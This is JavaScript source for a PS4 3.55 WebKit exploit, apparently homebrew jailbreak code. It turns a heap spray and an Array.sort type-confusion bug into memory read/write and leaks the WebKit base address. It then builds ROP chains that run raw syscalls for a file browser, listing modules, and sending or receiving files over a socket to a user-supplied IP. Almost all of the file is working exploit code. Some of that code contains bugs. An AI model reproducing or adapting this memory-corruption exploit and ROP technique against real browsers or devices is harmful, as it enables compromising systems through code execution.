var buf_addr = undefined;
var vtable_ptr = undefined;
var webkit_base_addr = undefined;
var cbuf = undefined;
var rop_buf = undefined;
var rop_buf_addr = undefined;
var u32buffer = undefined;
var storage = undefined;
var current_path = "";
var computer_ip = "";

function exploit()
{
	var spray = new Array(0x1000);
    for (var i = 0; i < spray.length; i++) {
        spray[i] = new Uint32Array(0x1A7);
    }

    var almost_oversize = 0x3000;
    var foo = new Array(almost_oversize);
    var normal_length = 0x800;
    var fu = new Array(normal_length);
    var o = {};
    var arrays = new Array(0x4);
    storage = new Storage();

    o.toString = function() {
        foo.push(12345);
        for (var i = 0; i < arrays.length; ++i) {
            var bar = Array.prototype.constructor.apply(null, fu);
            bar[0] = 1;
            bar[1] = 2;
            bar[2] = 3;
            arrays[i] = bar;
        }
        return "";
    };

    foo[0] = o;

    len = u2d(0x80000000, 0x80000000);
    for (var i = 1; i < foo.length; ++i) {
        foo[i] = len;
    }

    foo.sort();
    o.toString = function() {};

    u32buffer = new Array(0x100);
    for (var i = 0; i < 0x100; i++) {
        var v = new Uint32Array(0x13AC);
        for (var j = 0; j < v.length; j++) {
            if (j % 2 == 1)
                v[j] = 0x41414141;
            else
                v[j] = j;
        }
        u32buffer[i] = v;
    }

    arr = arrays[1];

    var start_offset = 0x2F000;
    var offset = d2u(arr[(start_offset) + 0x3000 / 8 + (0x5000 / 8 * -40)]).low;
    var offset2 = d2u(arr[(start_offset) + 0x3000 / 8 + (0x5000 / 8 * 30)]).low;
    var index = 0;
    for (var i = 49; i < 60; i++) {
        var val = d2u(arr[(start_offset) + 0x3000 / 8 + (0x5000 / 8 * i) - offset / 2 - 1]).hi;
        if (val == 0xbadaeef7) {
            index = i;
            break;
        }
    }

    arr[(start_offset) + 0x3000 / 8 + (0x5000 / 8 * index) - offset2 / 2 + 7] = u2d(0x80000000, 0xbadbeef7);
    arr[(start_offset) + 0x3000 / 8 + (0x5000 / 8 * index) - offset2 / 2 + 2] = arr[(start_offset) + 0x3000 / 8 + (0x5000 / 8 * index) - offset2 / 2 + 4];

    for (var i = 0; i < u32buffer.length; i++) {
        if (u32buffer[i].length != 0x13AC) {
            buf_addr = new dcodeIO.Long(u32buffer[i][2], u32buffer[i][3], true);
            u32buffer[i][4] = (0x60000 * 4);
            u32buffer[i][2] = u32buffer[i][6];
            u32buffer[i][3] = u32buffer[i][7];
            break;
        }
    }

    for (var i = 0; i < u32buffer[i].length; i++) {
        if (u32buffer[i].buffer.byteLength != 0x4eb0) {
            cbuf = new Uint32Array(u32buffer[i].buffer);
            break;
        }
    }

    vtable_ptr = new dcodeIO.Long(cbuf[0], cbuf[1], true);
    webkit_base_addr = vtable_ptr.sub(0x2600d80);
    cbuf[0x1e] = 0x600000;

    for (var i = 0; i < u32buffer[i].length; i++) {
        if (u32buffer[i].length == 0x600000) {
            rop_buf = u32buffer[i];
            break;
        }
    }

    for (var i = 0; i < 0x30000; i++) {
        rop_buf[i] = 0;
    }

    rop_buf_addr = new dcodeIO.Long(cbuf[0x14], cbuf[0x15], true);

    rop_buf_addr = rop_buf_addr.add(0x10000 * 4);
    cbuf[0x14] = rop_buf_addr.getLowBitsUnsigned();
    cbuf[0x15] = rop_buf_addr.getHighBitsUnsigned();

    storage.set_initial_addr(rop_buf_addr.add(0x10000 * 4));

    document.getElementById("exp").disabled = true;
    document.getElementById("exp").innerHTML = "Exploit loaded !";
    document.getElementById("pid").disabled = false;
    document.getElementById("dir").disabled = false;
    document.getElementById("mod").disabled = false;
    document.getElementById("testsok").disabled = false;
}

function open(path, flags, mode)
{
	var fd = storage.alloc(0x4);
    var dir_path = storage.alloc(0x255);
    write_str(dir_path, path);

    var r = new RopChain();
    r.syscall(5, dir_path, flags, mode);
    r.add('pop rdi');
    r.add(fd);
    r.add('mov qword ptr [rdi], rax');
    r.execute();
    fd = read32(fd);
    storage.free(0x4);
	return fd;
}

function creat(path, mode)
{
	var fd = storage.alloc(0x4);
    var dir_path = storage.alloc(0x255);
    write_str(dir_path, path);

    var r = new RopChain();
    r.syscall(8, dir_path, mode);
    r.add('pop rdi');
    r.add(fd);
    r.add('mov qword ptr [rdi], rax');
    r.execute();
    fd = read32(fd);
    storage.free(0x259);
	return fd;
}

function getdents(fd, buf, len)
{
	var ret = storage.alloc(0x4);
	fill_null(buf, 0x1000);

    var r = new RopChain();
    r.syscall(272, fd, buf, len);
    r.add('pop rdi');
    r.add(ret);
    r.add('mov qword ptr [rdi], rax');
    r.execute();

    storage.free(0x4);
    return read32(ret);
}

function parse_dents(buf, len)
{
	// Code from PS4-Playground of Specter
	var files = [];

	for (var i = 0; i<len;) {
		var reclen = read16(buf.add(i + 4));
		if (reclen == 0)
			break;

		var type = read8(buf.add(i + 6));
		var name = read_str(buf.add(i + 8));
		
		files.push({type: type, name: name});

		i += reclen;
	}

	return files;
}

function path_back(path)
{
	var path = path.substr(0, path.length - 1);
	var pos = path.lastIndexOf('/');
	var path = path.substr(0, pos+1);
	return path;
}

function credit()
{
	alert("- PS4 3.55 File Browser -\n\rCredit:\n\rTheoryWrong for FileBrowser\n\rxyz for original henkaku\n\rFire30 for port to PS4\n\rCTurt for this work on 1.76");
}

function getmodules()
{
    for (var i = 0; i < 0x100; i++) {
        var buf = storage.alloc(0x1A8);
        var ret = storage.alloc(0x4);
        write32(buf, 0x1A8);
        var r = new RopChain();
        r.syscall(608, i, 0, buf);
        r.add('pop rdi');
        r.add(ret);
        r.add('mov qword ptr [rdi], rax');
        r.execute();

        if (read32(ret) != 0)
            continue;

        var base = read64(buf.add(0x44 * 4));

        var msg = 'Module name: ' + read_str(buf.add(0x8));
        msg = msg + '\r\nModule Index: ' + i.toString(16);
        msg = msg + '\r\nModule Base: ' + base.toString(16);

      	alert(msg);

      	memory_dump(8, buf.add(0x44 * 4), 0x8);
      	memory_dump(8, buf, 0x500);

        storage.free(0x1A8 + 0x4);
    }
}

function getdir(path)
{
	if (path == null)
	{
		path = current_path;
	}
	else if (path == "..")
	{
		current_path = path_back(current_path);
		path = current_path;
	}
	else
	{
		current_path = current_path	+ path + "/";
		path = current_path;
	}

	var dir_data = storage.alloc(0x1000);
	var fd = open(path, 0x0, 0x0);
	if (fd == 2)
	{
		alert("No such file or directory");
		return;
	}
	getdents(fd, dir_data, 0x1000);
	var files = parse_dents(dir_data, 0x1000);
	storage.free(0x1000);
	var file_exp = "";
	for (var i = 0; i<files.length; i++) {
		if (files[i]['type'] == 4)
		{
			file_exp = file_exp + "<h1>[DIR] <a href=\"#\" onclick=\"getdir('"+files[i]['name']+"')\">" + files[i]['name'] + "</a></h1>";
		}
		else if (files[i]['type'] == 8)
		{
			file_exp = file_exp + "<h1>[FILE] <a href=\"#\" onclick=\"sendfile('"+files[i]['name']+"')\">" + files[i]['name'] + "</a></h1>";
		}
		else
		{
			file_exp = file_exp + "<h1>[OTHER] <a href=\"#\" onclick=\"\">" + files[i]['name'] + "</a></h1>";
		}
	}
	file_exp =  "<h1>- File in " + path + " -</h1><a href=\"#\" onclick=\"getdir('..')\"><h1><< Back</h1></a><br/>" + file_exp;
	document.getElementById("directory").innerHTML = file_exp;
}

function loaddir(path)
{
	current_path = path;
	getdir();
}

function sendfile(path)
{
	var wait_resp = storage.alloc(0x1);

	var sock = socket();
	if (computer_ip == "") { computer_ip = prompt("Enter Computer IP"); }
	connect_helper(sock, computer_ip, 2727);

	var request = storage.alloc(0x8);
	write_str(request, 'download');
	write(sock, request, 0x8);
	
	read(sock, wait_resp, 0x1);

	var filename = storage.alloc(path.length);
	write_str(filename, path);
	write(sock, filename, path.length);

	read(sock, wait_resp, 0x1, 0);

	var fd = open(current_path+path);
	var data = storage.alloc(0x10000);
	var r_size = read(fd, data, 0x10000);

	write(sock, data, r_size);
	storage.free(0x10008 + path.length);
}

function getpid() {
	var ret = storage.alloc(0x4)
	var r = new RopChain();
	r.syscall(20); // SysCall #20 - GetPID()
	r.add('pop rdi')
	r.add(ret)
	r.add('mov qword ptr [rdi], rax')
	r.execute();

	alert("Current PID: " + read32(ret));
}

function upload()
{
	var sock = socket();

	if (computer_ip == "") { computer_ip = prompt("Enter Computer IP"); }
	connect_helper(sock, computer_ip, 2727);

	var request = storage.alloc(0x6);
	write_str(request, 'upload');
	write(sock, request, 0x6);

	var filename = storage.alloc(0x50);
	fill_null(filename, 0x50);
	read(sock, filename, 0x50);
	alert("File: " + current_path+read_str(filename));

	write(sock, request, 0x1);

	var file_data = storage.alloc(0x5000);
	fill_null(file_data, 0x5000);
	var r_size = read(sock, file_data, 0x5000);
	alert("File Downloaded !");
	var fd = open(current_path+read_str(filename), 2, 1);
	alert("Step OK !");
	var result = write(fd, file_data, r_size);
	alert("FD: " + fd + " Result: " + result);
	memory_dump(8, file_data, 0x5000);

	storage.free(0x5056);
	alert("Upload complete !");
}

function testsock()
{
	var sock = socket();
	if (computer_ip == "") { computer_ip = prompt("Enter Computer IP"); }
	connect_helper(sock, computer_ip, 2727);

	var msg = storage.alloc(0x5);
	write_str(msg, 'pong!');

 	write(fd, msg, 0x5);

 	alert("Send !");
}

function createserver()
{

}
